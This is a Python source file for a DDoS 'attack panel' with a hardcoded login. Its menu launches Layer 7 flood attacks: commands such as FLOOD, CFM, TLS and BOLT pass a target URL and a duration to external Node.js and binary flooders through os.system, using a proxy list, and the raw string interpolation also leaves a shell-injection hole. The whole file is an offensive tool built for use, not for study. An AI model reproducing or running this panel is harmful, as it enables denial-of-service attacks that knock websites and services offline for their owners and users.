# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\033[36m

╔═╗╦ ╦╔╗ ╔═╗╦═╗   ╔═╗╔═╗╦═╗╔═╗╔═╗╦═╗╔═╗╦═╗
║  ╚╦╝╠╩╗║╣ ╠╦╝───╚═╗║ ║╠╦╝║  ║╣ ╠╦╝║╣ ╠╦╝
╚═╝ ╩ ╚═╝╚═╝╩╚═   ╚═╝╚═╝╩╚═╚═╝╚═╝╩╚═╚═╝╩╚═


==[ USAGE ] === [ FOR START ATTACK !] ==
TYPE: [METHOD] [URL] [TIME] 

==[ NOTE ] ==
METHOD: FLOOD Input finally you can enter bypass/flood

==[ LAYER 7 ] ==== [ LAYER 4 ] === [ LAYER 12 ] ==
       • BOLT                 • NOT YET           • NOT YET
       • OMG
       • NOX
       • 404
       • YOLO
       • TLS
       • BOT
       • CFM
       • FLOOD 
       
\033[0m""")

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\033[36m

╔═╗╦ ╦╔╗ ╔═╗╦═╗   ╔═╗╔═╗╦═╗╔═╗╔═╗╦═╗╔═╗╦═╗      TELEGRAM:@Not_found_404_not_responding(CYBER-SORCERER)   
║  ╚╦╝╠╩╗║╣ ╠╦╝───╚═╗║ ║╠╦╝║  ║╣ ╠╦╝║╣ ╠╦╝
╚═╝ ╩ ╚═╝╚═╝╩╚═   ╚═╝╚═╝╩╚═╚═╝╚═╝╩╚═╚═╝╩╚═
  
""")

	while True:
		sys.stdout.write(f"\x1b]2;[\] CYBER-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[0;30;46mCYBER@PANEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()

#########LAYER-7########  

		elif sinput == "FLOOD" or sinput == "flood":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node flooderv2.js {target} {time} 10 proxy.txt 512')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "cfm" or sinput == "CFM":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node UAM.js {target} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "BOLT" or sinput == "bolt":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && ./BOLT {url} {time} 64 10')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "OMG" or sinput == "omg":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && ./OMG GET {url} proxy.txt {time} 64 10')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
			
		elif sinput == "YOLO" or sinput == "yolo":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node YOLO.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "TLS" or sinput == "tls":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS.js GET {url} proxy.txt {time} 64 10')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "NOX" or sinput == "nox":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node NOX.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "BOT" or sinput == "bot":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node BOT.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "404":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node 404.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
		
					
 
def login():
	sys.stdout.write(f"\x1b]2;[\] CYBER-SORCERER-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = "CYBER"
	passwd = "@CS"
	username = input("""\033[36m

╔═╗╦ ╦╔╗ ╔═╗╦═╗   ╔═╗╔═╗╦═╗╔═╗╔═╗╦═╗╔═╗╦═╗     TELEGRAM:@Not_found_404_not_responding(CYBER-SORCERER)
║  ╚╦╝╠╩╗║╣ ╠╦╝───╚═╗║ ║╠╦╝║  ║╣ ╠╦╝║╣ ╠╦╝
╚═╝ ╩ ╚═╝╚═╝╩╚═   ╚═╝╚═╝╩╚═╚═╝╚═╝╩╚═╚═╝╩╚═

						   
\033[36m[\033[32mUSERNAME\033[36m]:\033[0m """)
	password = getpass.getpass(prompt='\033[36m[\033[32mPASSWORD\033[36m]:\033[0m ')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		print("\033[36mSuccessfully Login to ur Account")
		time.sleep(1)
		main()

login()